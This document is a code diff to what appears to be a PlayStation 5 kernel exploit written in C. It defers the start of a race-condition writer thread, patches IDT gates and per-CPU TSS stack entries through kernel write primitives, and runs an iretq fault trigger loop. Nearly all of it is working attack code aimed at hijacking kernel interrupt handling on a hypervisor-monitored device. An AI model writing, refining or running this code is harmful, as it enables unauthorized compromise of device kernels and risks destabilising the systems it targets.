@@ -4661,23 +4661,21 @@ broad_done:
             }
         }
 
-        /* 7h. Start writer thread */
-        send_response(sock, "\n7h. Starting writer thread...\n");
+        /* 7h. Prepare writer thread state (thread created later in Phase 3)
+         *
+         * The writer thread is a tight busy-loop that consumes 100% of
+         * one CPU core.  On PS5 with HV monitoring, starting it too
+         * early can trigger a watchdog/power-management kernel panic.
+         * We defer creation to just before the trigger loop. */
+        send_response(sock, "\n7h. Preparing writer state (deferred start)...\n");
         gp_trap_stop_writer = 0;
-        gp_trap_writer_active = 0; /* only activate during trigger */
+        gp_trap_writer_active = 0;
         gp_trap_got_result = 0;
         gp_trap_doreti_addr = 0;
 
         /* Set global IST pointer for signal handler to read trap frame */
         gp_trap_ist_page_ptr = (volatile uint8_t *)ist_page;
-
-        if (thrd_create(&writer_thread, gp_trap_writer_fn, ist_page) == thrd_success) {
-            writer_started = 1;
-            send_response(sock, "  Writer thread started (target: ist_page+0xFE0)\n");
-        } else {
-            send_response(sock, "  thrd_create failed\n");
-            goto step7_cleanup;
-        }
+        send_response(sock, "  Writer will target ist_page+0xFE0 (created in Phase 3)\n");
 
         /* 7i. Probe ucontext_t layout + trigger iretq fault
          *
@@ -4871,6 +4869,35 @@ broad_done:
             send_response(sock, "  #SS gate IST -> 7\n");
         }
 
+        /* Step 3: Start writer thread NOW — right before trigger */
+        send_response(sock, "  Starting writer thread...\n");
+        if (thrd_create(&writer_thread, gp_trap_writer_fn, ist_page) == thrd_success) {
+            writer_started = 1;
+        } else {
+            send_response(sock, "  thrd_create failed — aborting\n");
+            /* Restore patches before cleanup */
+            if (idt_gate_modified) {
+                kernel_setchar(idt_access + 13 * 16 + 4, idt_gate_saved[4]);
+                idt_gate_modified = 0;
+            }
+            if (ss_gate_modified) {
+                kernel_setchar(idt_access + 12 * 16 + 4, ss_gate_saved[4]);
+                ss_gate_modified = 0;
+            }
+            {
+                int idx2 = gp_ist_index - 1;
+                for (int cpu = 0; cpu < num_cpus_found; cpu++) {
+                    if (ist_modified_percpu[cpu][idx2]) {
+                        uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
+                        kernel_setlong(cpu_tss + 0x24 + idx2 * 8,
+                                       ist_saved_percpu[cpu][idx2]);
+                        ist_modified_percpu[cpu][idx2] = 0;
+                    }
+                }
+            }
+            goto step7_cleanup;
+        }
+
         send_response(sock, "\n  WARNING: IDT is now live — each attempt risks\n"
                       "  kernel panic if the CS race loses.\n");
         send_response(sock, "  Starting trigger loop (10 attempts)...\n");
@@ -5007,6 +5034,14 @@ broad_done:
                         *(volatile uint64_t *)(istp + i));
                 send_response(sock, "\n");
             }
+        }
+
+        /* Stop writer thread FIRST — it's a tight spin loop */
+        gp_trap_stop_writer = 1;
+        if (writer_started) {
+            thrd_join(writer_thread, NULL);
+            writer_started = 0;
+            send_response(sock, "  Writer thread stopped\n");
         }
 
         /* Immediately restore IDT/TSS patches — every microsecond
